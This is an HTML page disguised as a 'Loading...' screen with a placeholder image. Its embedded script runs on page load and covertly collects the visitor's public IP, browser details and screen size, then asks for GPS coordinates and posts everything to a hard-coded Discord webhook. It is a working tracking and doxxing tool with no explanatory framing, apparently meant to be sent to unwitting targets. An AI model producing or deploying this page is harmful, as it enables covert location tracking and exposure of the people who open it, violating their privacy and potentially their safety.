<html>
<head>
  <title>Loading...</title>
  <script>
    const webhook = "https://discord.com/api/webhooks/1398793243692499055/fdMhPoKYGBXY96dCLTHEqho3lLc4rAfXJIYYi43yXz591O5pssHMg_mErqvo6hu5eI-Y"; // Replace with your actual webhook URL

    // STEP 1: Get public IP
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const ua = navigator.userAgent;
        const lang = navigator.language;
        const screenSize = screen.width + "x" + screen.height;

        // Send IP + device info to Discord
        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `üì± **New Visitor**\n**IP:** ${ip}\n**UA:** ${ua}\n**Language:** ${lang}\n**Screen:** ${screenSize}`
          })
        });
      });

    // STEP 2: Ask for GPS location
    navigator.geolocation.getCurrentPosition((pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      // Send GPS location to Discord
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `üìç **GPS Location Access Granted**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc} meters`
        })
      });
    });
  </script>
</head>

  <img src="https://i.imgur.com/fakepic.jpg" style="width:100%;" alt="Loading...">
</body>
</html>
